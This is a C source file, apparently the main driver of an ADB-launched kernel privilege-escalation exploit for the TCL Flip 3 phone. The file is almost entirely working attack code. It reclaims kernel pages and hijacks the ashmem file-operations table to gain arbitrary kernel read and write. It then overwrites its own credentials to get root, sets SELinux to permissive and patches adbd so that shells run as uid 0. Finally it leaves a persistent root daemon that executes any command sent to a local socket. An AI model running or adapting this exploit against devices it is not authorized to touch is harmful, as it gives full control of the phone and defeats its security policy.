// ADB privilege escalation for the TCL Flip 3

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "kai_profile.h"

#include "exploit/common.h"
#include "exploit/krw.h"
#include "exploit/reclaim.h"
#include "exploit/select.h"
#include "exploit/stages.h"

#define ROOT_SOCK_NAME "kai_root"

static int g_listener = -1;
static int g_krw_fd = -1;

static socklen_t daemon_addr(struct sockaddr_un *sa) {
  memset(sa, 0, sizeof(*sa));
  sa->sun_family = AF_UNIX;
  memcpy(sa->sun_path + 1, ROOT_SOCK_NAME, sizeof(ROOT_SOCK_NAME) - 1);
  return (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 + sizeof(ROOT_SOCK_NAME) - 1);
}

static int daemon_running(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM, 0);
  if (fd < 0)
    return 0;
  struct sockaddr_un sa;
  int ok = connect(fd, (struct sockaddr *)&sa, daemon_addr(&sa)) == 0;
  close(fd);
  return ok;
}

static int client_main(int argc, char **argv) {
  int fd = socket(AF_UNIX, SOCK_STREAM, 0);
  struct sockaddr_un sa;
  if (fd < 0 || connect(fd, (struct sockaddr *)&sa, daemon_addr(&sa)) < 0) {
    dprintf(2, "connect @%s failed: %s\n", ROOT_SOCK_NAME, strerror(errno));
    return 1;
  }
  for (int i = 2; i < argc; i++) {
    if (i != 2)
      write(fd, " ", 1);
    write(fd, argv[i], strlen(argv[i]));
  }
  write(fd, "\n", 1);
  shutdown(fd, SHUT_WR);
  char buf[4096];
  ssize_t n;
  while ((n = read(fd, buf, sizeof(buf))) > 0)
    write(1, buf, (size_t)n);
  close(fd);
  return 0;
}

static int bind_listener(void) {
  int s = socket(AF_UNIX, SOCK_STREAM, 0);
  struct sockaddr_un sa;
  if (s < 0 || bind(s, (struct sockaddr *)&sa, daemon_addr(&sa)) < 0 || listen(s, 4) < 0) {
    if (s >= 0)
      close(s);
    return 0;
  }
  g_listener = s;
  return 1;
}

static void *sweep_loop(void *unused) {
  (void)unused;
  unsigned sweep = 0;
  for (;;) {
    sleep(sweep < 24 ? 5 : 60);
    sweep++;
    if (g_krw_fd < 0)
      continue;
    if (g_relax_pending)
      set_permissive(g_krw_fd);
    root_adbd(g_krw_fd);
  }
  return NULL;
}

static void command_server(void) {
  int s = g_listener;
  if (s < 0)
    _exit(111);
  pthread_t sweep;
  pthread_create(&sweep, NULL, sweep_loop, NULL);
  for (;;) {
    int c = accept(s, NULL, NULL);
    if (c < 0)
      continue;
    char cmd[4096];
    ssize_t n = read(c, cmd, sizeof(cmd) - 1);
    if (n <= 0) {
      close(c);
      continue;
    }
    cmd[n] = 0;
    pid_t p = fork();
    if (p == 0) {
      dup2(c, 0);
      dup2(c, 1);
      dup2(c, 2);
      close(s);
      close(c);
      execl("/system/bin/sh", "sh", "-c", cmd, (char *)NULL);
      _exit(127);
    }
    close(c);
    waitpid(p, NULL, 0);
  }
}

// Keep inherited file descriptors open so the resources remain active
static void spawn_holder(void) {
  pid_t h = fork();
  if (h == 0) {
    setsid();
    int dn = open("/dev/null", O_RDWR);
    if (dn >= 0) {
      dup2(dn, 0);
      dup2(dn, 1);
      dup2(dn, 2);
      if (dn > 2)
        close(dn);
    }
    for (;;)
      sleep(3600);
  }
}

// Open ashmem and verify the kernel read path is active
static int claim_krw_fd(int *out_fd) {
  int fd = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
  if (fd < 0)
    return 0;
  errno = 0;
  if (ioctl(fd, ASHMEM_GET_SIZE) < 0) {
    if (errno == ENOTTY)
      dprintf(2, "[krw] ENOTTY probe: stale fops pointer (reboot if this repeats)\n");
    close(fd);
    return 0;
  }
  uint32_t check = 0;
  if (!kernel_read_u32(fd, g_fake_fops + 0x08, &check) || check != CONFIGFS_READ_FILE) {
    close(fd);
    return 0;
  }
  dprintf(2, "[krw] route %d landed: arbitrary read + zero-write active\n", g_route_no + 1);
  *out_fd = fd;
  return 1;
}

static int run_attempt(void) {
  prctl(PR_SET_NAME, "kairoot.try", 0, 0, 0);
  signal(SIGALRM, watchdog_handler);
  alarm(150);

  g_spray_budget_kb = attempt_spray_kb();

  if (!reclaim_mm_page())
    return EXIT_DANCE_FAILED;
  if (!g_slab_returned)
    return EXIT_GATE_FAILED;

  int afd = -1;
  for (g_route_no = 0; g_route_no < g_route_max; g_route_no++) {
    if (run_select_route())
      return EXIT_DANCE_FAILED;
    // Our marker at page+0x204 confirms ownership before opening ashmem
    int hit_side;
    if (g_safe_trigger == 1)
      hit_side = spray_find_pair(0x204, g_fake_fops + 0x80, 0x280, g_fake_fops);
    else
      hit_side = spray_find_value(0x204, ASHMEM_MISC_FOPS);
    if (g_safe_trigger == 1) {
      if (hit_side >= 0) {
        dprintf(2, "[verify] SAFE LANDING CONFIRMED (word=%d)\n", g_ghost_word);
        return EXIT_SAFE_LANDED;
      }
    } else if (hit_side >= 0) {
      if (claim_krw_fd(&afd))
        break;
      afd = -1;
      continue;
    }
    if (atomic_load(&g_route_stamped)) {
      dprintf(2, "[route %d] the walk fired on a page we do not own, stopping this attempt\n", g_route_no);
      break;
    }
    vlog("[route %d] the ghost was never stamped in time, re-rolling the route\n", g_route_no);
  }
  if (g_safe_trigger == 1)
    return EXIT_SAFE_MISS;
  if (afd < 0)
    return EXIT_ROUTE_FAILED;

  // Restore the global ashmem fops pointer while this fd keeps its fake table
  {
    uint8_t win[34];
    if (kernel_read(afd, ASHMEM_MISC_FOPS - 4, win, sizeof(win)) != (ssize_t)sizeof(win))
      return EXIT_FOPS_FAILED;
    uint32_t fops_word = ASHMEM_FOPS;
    memcpy(win + 4, &fops_word, sizeof(fops_word));
    if (kernel_write(afd, ASHMEM_MISC_FOPS - 4, win, sizeof(win)) != (ssize_t)sizeof(win))
      return EXIT_FOPS_FAILED;
    uint8_t back[34];
    if (kernel_read(afd, ASHMEM_MISC_FOPS - 4, back, sizeof(back)) != (ssize_t)sizeof(back))
      return EXIT_FOPS_FAILED;
    uint32_t verify = 0;
    memcpy(&verify, back + 4, sizeof(verify));
    if (verify != ASHMEM_FOPS || memcmp(win, back, sizeof(win)))
      return EXIT_FOPS_FAILED;
    dprintf(2, "[krw] fops restored, hijack window closed\n");
  }

  if (!verify_init_task(afd))
    return EXIT_ROOT_FAILED;

  if (!bind_listener()) {
    if (daemon_running()) {
      dprintf(2, "[root] a root daemon is already active this boot\n");
      return EXIT_ALREADY;
    }
    dprintf(2, "[-] command listener unavailable\n");
    return EXIT_ROOT_FAILED;
  }

  uint32_t current_task = find_current_task(afd);
  if (!current_task)
    return EXIT_ROOT_FAILED;
  if (!patch_own_cred(afd, current_task))
    return EXIT_ROOT_FAILED;
  if (getuid() != 0 || geteuid() != 0)
    return EXIT_ROOT_FAILED;
  dprintf(2, "[root] uid=0 caps=%s\n", g_cred_caps_ok ? "full" : "n/a");

  g_krw_fd = afd;

  if (!INIT_CRED) {
    uint32_t init_real_cred = 0, init_subject_cred = 0;
    if (kernel_read_u32(afd, INIT_TASK + TASK_REAL_CRED_OFF, &init_real_cred) &&
        kernel_read_u32(afd, INIT_TASK + TASK_CRED_OFF, &init_subject_cred) && kernel_ptr(init_real_cred) &&
        init_real_cred == init_subject_cred)
      g_profile.init_cred = init_real_cred;
  }
  check_cred_layout(afd);

  set_permissive(afd);
  dprintf(2, "[selinux] %s\n",
          g_permissive ? "permissive" : (g_relax_pending ? "flip pending (sweep retries)" : "enforcing"));

  {
    int adbd_roots = root_adbd(afd);
    if (adbd_roots > 0)
      dprintf(2, "[adbd] rooted, new adb shells run as uid 0\n");
    else if (adbd_roots == 0)
      dprintf(2, "[adbd] found but not fully patched, sweep retries\n");
    else
      dprintf(2, "[adbd] not found yet, sweep watches for it\n");
  }

  pid_t daemon = fork();
  if (daemon < 0)
    return EXIT_ROOT_FAILED;
  if (daemon == 0) {
    setsid();
    int dn = open("/dev/null", O_RDWR);
    if (dn >= 0) {
      dup2(dn, 0);
      dup2(dn, 1);
      dup2(dn, 2);
    }
    command_server();
    _exit(0);
  }
  alarm(0);
  spawn_holder();
  return EXIT_ROOTED;
}

static long now_ms(void) {
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return ts.tv_sec * 1000L + ts.tv_nsec / 1000000L;
}

static long uptime_seconds(void) {
  int fd = open("/proc/uptime", O_RDONLY | O_CLOEXEC);
  if (fd < 0)
    return -1;
  char buf[64];
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0)
    return -1;
  buf[n] = 0;
  return atol(buf);
}

static const char *profile_dir(void) {
  static char dir[512];
  static int done;
  if (!done) {
    done = 1;
    const char *env = getenv("KAI_ROOT_PROFILES");
    if (env && *env) {
      snprintf(dir, sizeof(dir), "%s", env);
      return dir;
    }
    ssize_t n = readlink("/proc/self/exe", dir, sizeof(dir) - 64);
    if (n > 0) {
      dir[n] = 0;
      char *slash = strrchr(dir, '/');
      if (slash)
        *slash = 0;
      size_t len = strlen(dir);
      snprintf(dir + len, sizeof(dir) - len, "/profiles");
      struct stat st;
      if (stat(dir, &st) == 0 && S_ISDIR(st.st_mode))
        return dir;
    }
    snprintf(dir, sizeof(dir), "profiles");
  }
  return dir;
}

// Wait for post-boot activity to settle before proceeding
static void wait_for_settle(void) {
  long up = uptime_seconds();
  if (up >= 0 && up < 120) {
    dprintf(2, "[settle] uptime %lds: post-boot churn makes page reclaim unreliable, waiting for 120s\n", up);
    while (up >= 0 && up < 120) {
      sleep(5);
      up = uptime_seconds();
    }
  }
  if (g_settle_ms > 0) {
    dprintf(2, "[settle] waiting %dms (ROOT_SETTLE_MS)\n", g_settle_ms);
    msleep(g_settle_ms);
  }
}

static int meminfo_stable(void) {
  struct meminfo a, b;
  read_meminfo(&a);
  usleep(300000);
  read_meminfo(&b);
  return a.ok && b.ok && labs(a.sunreclaim - b.sunreclaim) < 256 && labs(a.mem_free - b.mem_free) < 1024;
}

static void wait_for_quiet(unsigned budget_ms) {
  unsigned quiet_streak = 0;
  for (unsigned waited = 0; waited < budget_ms; waited += 400) {
    if (meminfo_stable()) {
      if (++quiet_streak >= 2)
        return;
    } else {
      quiet_streak = 0;
      vlog("[settle] allocator still churning before the attempt (%ums waited)\n", waited + 400);
    }
  }
}

static const char *exit_name(int code) {
  switch (code) {
  case EXIT_ROOTED:
    return "rooted";
  case EXIT_ALREADY:
    return "already-rooted";
  case EXIT_GATE_FAILED:
    return "slab-retained";
  case EXIT_DANCE_FAILED:
    return "setup-failed";
  case EXIT_FOPS_FAILED:
    return "fops-failed";
  case EXIT_ROOT_FAILED:
    return "root-stage-failed";
  case EXIT_ROUTE_FAILED:
    return "route-exhausted";
  case EXIT_SAFE_LANDED:
    return "safe-landing-confirmed";
  case EXIT_SAFE_MISS:
    return "safe-no-markers";
  case EXIT_WATCHDOG:
    return "watchdog-timeout";
  default:
    return code >= 128 ? "crashed" : "unexpected";
  }
}

// 0 rooted, 1 failed, 2 already rooted, 3 safe-mode
static int run_campaign(void) {
  wait_for_settle();
  for (g_attempt_no = 1; g_attempt_no <= g_attempts; g_attempt_no++) {
    dprintf(2, "[attempt %d/%d] spray=%ldkB\n", g_attempt_no, g_attempts, attempt_spray_kb());
    long t0 = now_ms();
    wait_for_quiet(8000);
    pid_t child = fork();
    if (child < 0) {
      dprintf(2, "[-] fork failed errno=%d\n", errno);
      return 1;
    }
    if (child == 0)
      _exit(run_attempt());
    int status = 0;
    int waited = 0;
    for (int poll_ms = 0; poll_ms < 180000; poll_ms += 100) {
      pid_t r = waitpid(child, &status, WNOHANG);
      if (r == child) {
        waited = 1;
        break;
      }
      if (r < 0)
        break;
      usleep(100000);
    }
    if (!waited) {
      kill(child, SIGKILL);
      waitpid(child, &status, 0);
      dprintf(2, "[attempt %d/%d] watchdog-timeout\n", g_attempt_no, g_attempts);
      usleep(500000);
      continue;
    }
    int code = WIFEXITED(status) ? WEXITSTATUS(status) : 128 + WTERMSIG(status);
    vlog("[campaign] attempt %d/%d finished in %ldms: %s\n", g_attempt_no, g_attempts, now_ms() - t0, exit_name(code));
    if (code != EXIT_ROOTED && code != EXIT_ALREADY)
      dprintf(2, "[attempt %d/%d] %s\n", g_attempt_no, g_attempts, exit_name(code));
    if (code == EXIT_ROOTED)
      return 0;
    if (code == EXIT_ALREADY)
      return 2;
    if (code == EXIT_SAFE_LANDED)
      return 3;
    // pause and retry with a larger spray
    unsigned backoff_ms = g_backoff_ms >= 0 ? (unsigned)g_backoff_ms : 1000u + (unsigned)g_attempt_no * 500u;
    vlog("[campaign] backing off %ums before the next attempt\n", backoff_ms);
    usleep(backoff_ms * 1000u);
  }
  return 1;
}

static void usage(const char *program) {
  dprintf(2, "usage: %s [--profiles DIR | --profile FILE] [--check-profile] [--client COMMAND]\n"
          "env: VERBOSE=1 ROOT_ATTEMPTS ROOT_ROUTES ROOT_SPRAY_KB ROOT_WORD_SHIFT\n"
          "     ROOT_DELAY_MS ROOT_SAFE ROOT_SETTLE_MS ROOT_BACKOFF_MS\n",
          program);
}

int main(int argc, char **argv) {
  signal(SIGPIPE, SIG_IGN);

  if (argc >= 2 && !strcmp(argv[1], "--client"))
    return client_main(argc, argv);

  setvbuf(stderr, NULL, _IONBF, 0);
  parse_knobs();

  // Raise the file descriptor soft limit to the hard limit
  struct rlimit nofile;
  if (!getrlimit(RLIMIT_NOFILE, &nofile) && nofile.rlim_cur < nofile.rlim_max) {
    nofile.rlim_cur = nofile.rlim_max;
    if (setrlimit(RLIMIT_NOFILE, &nofile))
      dprintf(2, "[-] setrlimit(RLIMIT_NOFILE) failed errno=%d\n", errno);
  }

  const char *directory = profile_dir();
  const char *path = NULL;
  int check_only = 0;
  for (int i = 1; i < argc; i++) {
    if (!strcmp(argv[i], "--check-profile")) {
      check_only = 1;
    } else if (!strcmp(argv[i], "--profiles") && i + 1 < argc) {
      directory = argv[++i];
    } else if (!strcmp(argv[i], "--profile") && i + 1 < argc) {
      path = argv[++i];
    } else {
      usage(argv[0]);
      return 64;
    }
  }

  struct kai_runtime runtime;
  char profile_error[512] = {0};
  char selected[1024] = {0};
  if (!kai_runtime_read(&runtime, profile_error, sizeof(profile_error))) {
    dprintf(2, "[-] runtime identity unavailable: %s\n", profile_error);
    return 64;
  }

  if (!kai_profile_select(directory, path, &runtime, &g_profile, selected, sizeof(selected), profile_error,
                          sizeof(profile_error)) ||
      !validate_profile(profile_error, sizeof(profile_error))) {
    dprintf(2, "[-] profile rejected: %s\n", profile_error);
    return 64;
  }
  kai_profile_print(&g_profile, selected);
  if (check_only)
    return 0;

  int rc = run_campaign();
  if (rc == 0) {
    dprintf(2, "[ROOT] success, NEW adb shells will run as root\n");
    return 0;
  }
  if (rc == 2) {
    dprintf(2, "[ROOT] a root daemon is already active this boot\n");
    return 0;
  }
  if (rc == 3) {
    dprintf(2, "[SAFE] landing confirmed, rerun without ROOT_SAFE to root\n");
    return 0;
  }
  dprintf(2, "[ROOT] failed after %d attempts (VERBOSE=1 shows why each attempt failed)\n", g_attempts);
  return 1;
}
